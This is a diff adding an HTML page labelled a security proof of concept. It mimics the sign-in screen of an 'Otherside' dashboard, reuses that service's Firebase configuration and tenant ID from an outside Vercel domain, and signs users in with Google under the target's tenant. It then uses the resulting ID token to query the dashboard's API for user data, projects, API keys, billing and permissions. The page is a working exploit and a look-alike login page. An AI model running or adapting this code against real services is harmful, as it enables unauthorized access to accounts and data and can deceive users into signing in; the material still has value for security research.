@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Otherside Dashboard - Security PoC</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #0a0a0a;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .login-container {
+            background: #141414;
+            border: 1px solid #2a2a2a;
+            border-radius: 16px;
+            padding: 48px;
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+        }
+        .logo {
+            width: 64px; height: 64px;
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            border-radius: 16px;
+            margin: 0 auto 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+        }
+        h1 { font-size: 24px; margin-bottom: 8px; }
+        .subtitle { color: #888; font-size: 14px; margin-bottom: 32px; }
+        .btn-google {
+            width: 100%;
+            padding: 14px;
+            background: #fff;
+            color: #333;
+            border: none;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            transition: all 0.2s;
+            margin-bottom: 12px;
+        }
+        .btn-google:hover { background: #f0f0f0; transform: translateY(-1px); }
+        .btn-google svg { width: 20px; height: 20px; }
+        .divider {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin: 20px 0;
+            color: #555;
+            font-size: 13px;
+        }
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #2a2a2a;
+        }
+        .btn-wallet {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            transition: all 0.2s;
+        }
+        .btn-wallet:hover { opacity: 0.9; }
+        
+        .research-panel {
+            margin-top: 32px;
+            padding: 16px;
+            background: #1a0a0a;
+            border: 1px solid #ff4444;
+            border-radius: 12px;
+            font-size: 12px;
+            text-align: left;
+        }
+        .research-panel h3 { color: #ff4444; margin-bottom: 8px; font-size: 13px; }
+        .research-panel code { color: #ff8888; word-break: break-all; }
+        .research-panel .status { margin-top: 8px; padding: 8px; background: #0a0a0a; border-radius: 6px; }
+        #auth-status { color: #4ade80; }
+        #token-output { 
+            max-height: 200px; overflow-y: auto; 
+            font-family: monospace; font-size: 10px; 
+            color: #aaa; margin-top: 8px; 
+            word-break: break-all;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">O</div>
+        <h1>Welcome to Otherside</h1>
+        <p class="subtitle">Sign in to access the dashboard</p>
+        
+        <button class="btn-google" onclick="signInWithGoogle()">
+            <svg viewBox="0 0 24 24">
+                <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 01-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/>
+                <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+                <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+            </svg>
+            Sign in with Google
+        </button>
+        
+        <div class="divider">or</div>
+        
+        <button class="btn-wallet" onclick="alert('Wallet sign-in requires a valid Ethereum signature')">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
+            </svg>
+            Connect Wallet
+        </button>
+
+        <div class="research-panel">
+            <h3>SECURITY RESEARCH PoC</h3>
+            <p>Domain: <code>m2-edison-preview.vercel.app</code></p>
+            <p>Project: <code>scarcely-calm-lark</code></p>
+            <p>Tenant: <code>hound-j8zaz</code></p>
+            <div class="status">
+                <span>Firebase: </span><span id="auth-status">Initializing...</span>
+            </div>
+            <div id="token-output"></div>
+        </div>
+    </div>
+
+    <!-- Firebase Compat SDK -->
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-auth-compat.js"></script>
+    
+    <script>
+        // =====================================================
+        // Firebase Configuration - EXACTLY as used by ODK Dashboard
+        // =====================================================
+        const firebaseConfig = {
+            apiKey: "AIzaSyDwML5MHO4FmSAwDHWWGNuS4JoIzu2ECS0",
+            authDomain: "scarcely-calm-lark.firebaseapp.com",
+            projectId: "scarcely-calm-lark",
+            storageBucket: "scarcely-calm-lark.appspot.com",
+            messagingSenderId: "761033708851",
+            appId: "1:761033708851:web:fb54f41dc499d5a8ee1a46"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+
+        // Get the auth instance
+        const auth = firebase.auth();
+
+        // =====================================================
+        // CRITICAL: Set tenant ID to "hound-j8zaz"
+        // This MUST be set BEFORE any sign-in attempt
+        // The ODK Dashboard uses getTenantedAuth("hound-j8zaz")
+        // =====================================================
+        auth.tenantId = "hound-j8zaz";
+
+        const tokenOutput = document.getElementById('token-output');
+        const authStatus = document.getElementById('auth-status');
+
+        function log(msg) {
+            const line = document.createElement('div');
+            line.textContent = msg;
+            tokenOutput.appendChild(line);
+            tokenOutput.scrollTop = tokenOutput.scrollHeight;
+        }
+
+        // Monitor auth state
+        auth.onAuthStateChanged(async (user) => {
+            if (user) {
+                authStatus.textContent = 'AUTHENTICATED';
+                authStatus.style.color = '#ff4444';
+                
+                log('[!] AUTHENTICATED under tenant: ' + user.tenantId);
+                log('[!] UID: ' + user.uid);
+                log('[!] Email: ' + user.email);
+                log('[!] Provider: ' + (user.providerData[0] ? user.providerData[0].providerId : 'unknown'));
+                
+                try {
+                    const idToken = await user.getIdToken();
+                    log('[!] ID TOKEN OBTAINED (' + idToken.length + ' chars)');
+                    log('[!] Token: ' + idToken.substring(0, 60) + '...');
+                    
+                    // Decode JWT
+                    const payload = JSON.parse(atob(idToken.split('.')[1]));
+                    log('[!] JWT tenant_id: ' + (payload.tenant_id || 'NONE'));
+                    log('[!] JWT email: ' + (payload.email || 'NONE'));
+                    log('[!] JWT iss: ' + payload.iss);
+                    
+                    // Test ODK Dashboard access
+                    log('[*] Testing ODK Dashboard API access...');
+                    
+                    const endpoints = [
+                        { url: 'v0/accounts/users/current', method: 'GET' },
+                        { url: 'v0/organizations/projects', method: 'GET' },
+                        { url: 'v0/origin/worlds', method: 'GET' },
+                        { url: 'v0/organizations/apiKeys', method: 'GET' },
+                        { url: 'v0/billing/enabled', method: 'GET' },
+                    ];
+                    
+                    for (const ep of endpoints) {
+                        try {
+                            const resp = await fetch('https://odk.otherside.xyz/api/' + ep.url, {
+                                method: ep.method,
+                                headers: { 'Authorization': 'Bearer ' + idToken }
+                            });
+                            const statusIcon = resp.ok ? '[!]' : '[-]';
+                            log(statusIcon + ' /' + ep.url + ': HTTP ' + resp.status);
+                            if (resp.ok) {
+                                const data = await resp.json();
+                                log('    Response: ' + JSON.stringify(data).substring(0, 200));
+                            }
+                        } catch(e) {
+                            log('[-] /' + ep.url + ': ERROR ' + e.message);
+                        }
+                    }
+                    
+                    // Check permissions
+                    try {
+                        const permResp = await fetch('https://odk.otherside.xyz/api/v0/permissions/resource/reviewAccess', {
+                            method: 'POST',
+                            headers: { 
+                                'Authorization': 'Bearer ' + idToken,
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                resource: 'o/fine-houses-deny-595464',
+                                verb: 'ALL'
+                            })
+                        });
+                        log('[*] /permissions/reviewAccess: HTTP ' + permResp.status);
+                        if (permResp.ok) {
+                            const permData = await permResp.json();
+                            log('[!] ACCESS: ' + JSON.stringify(permData).substring(0, 300));
+                        }
+                    } catch(e) {}
+
+                } catch (err) {
+                    log('[!] Token error: ' + err.message);
+                }
+            } else {
+                authStatus.textContent = 'Ready';
+                authStatus.style.color = '#4ade80';
+            }
+        });
+
+        // =====================================================
+        // Google Sign-In - Using CORRECT Compat SDK syntax
+        // =====================================================
+        // FIX: Compat SDK uses auth.signInWithPopup(provider)
+        // NOT firebase.auth().signInWithPopup(auth, provider)
+        // The previous version had wrong argument order causing
+        // auth/argument-error
+        // =====================================================
+        async function signInWithGoogle() {
+            log('[*] Initiating Google OAuth...');
+            log('[*] Tenant: ' + auth.tenantId);
+            log('[*] Origin: ' + window.location.origin);
+            
+            const provider = new firebase.auth.GoogleAuthProvider();
+            provider.addScope('profile');
+            provider.addScope('email');
+            
+            try {
+                // ✅ CORRECT: Compat SDK - auth.signInWithPopup(provider)
+                // ❌ WRONG:  firebase.auth().signInWithPopup(auth, provider)
+                const result = await auth.signInWithPopup(provider);
+                
+                log('[+] OAuth SUCCESS!');
+                log('[+] Email: ' + result.user.email);
+                log('[+] Tenant: ' + result.user.tenantId);
+                log('[+] UID: ' + result.user.uid);
+                
+                if (result.credential) {
+                    log('[+] Google access token: ' + (result.credential.accessToken || '').substring(0, 30) + '...');
+                }
+                
+                if (result.additionalUserInfo) {
+                    log('[+] New user: ' + result.additionalUserInfo.isNewUser);
+                }
+                
+            } catch (error) {
+                log('[!] Error: ' + error.code);
+                log('[!] Message: ' + error.message);
+                
+                // Detailed error analysis
+                if (error.code === 'auth/unauthorized-domain') {
+                    log('[!] BLOCKED: Domain not in Firebase authorizedDomains');
+                    log('[!] This means the attack vector is CLOSED');
+                } else if (error.code === 'auth/argument-error') {
+                    log('[!] BUG: Incorrect function arguments');
+                    log('[!] This is a code bug, not a security control');
+                } else if (error.code === 'auth/popup-closed-by-user') {
+                    log('[*] User closed the popup window');
+                } else if (error.code === 'auth/popup-blocked') {
+                    log('[!] Popup blocked by browser');
+                    log('[*] Trying redirect method instead...');
+                    // Fallback to redirect method
+                    auth.signInWithRedirect(provider);
+                } else if (error.code === 'auth/tenant-id-mismatch') {
+                    log('[!] Tenant mismatch');
+                } else if (error.code === 'auth/operation-not-allowed') {
+                    log('[!] Google OAuth not enabled for this tenant');
+                } else {
+                    log('[!] Unknown error code: ' + error.code);
+                }
+            }
+        }
+
+        // Handle redirect result (for fallback)
+        auth.getRedirectResult().then((result) => {
+            if (result.user) {
+                log('[+] Redirect sign-in successful!');
+                log('[+] Email: ' + result.user.email);
+            }
+        }).catch((error) => {
+            if (error.code !== 'auth/no-auth-event') {
+                log('[!] Redirect error: ' + error.code + ' - ' + error.message);
+            }
+        });
+
+        // Initial log
+        log('[*] Firebase initialized successfully');
+        log('[*] Project: scarcely-calm-lark');
+        log('[*] Tenant: hound-j8zaz');
+        log('[*] authDomain: scarcely-calm-lark.firebaseapp.com');
+        log('[*] Host: ' + window.location.hostname);
+        log('[*] Ready for Google OAuth');
+    </script>
+</body>
+</html>
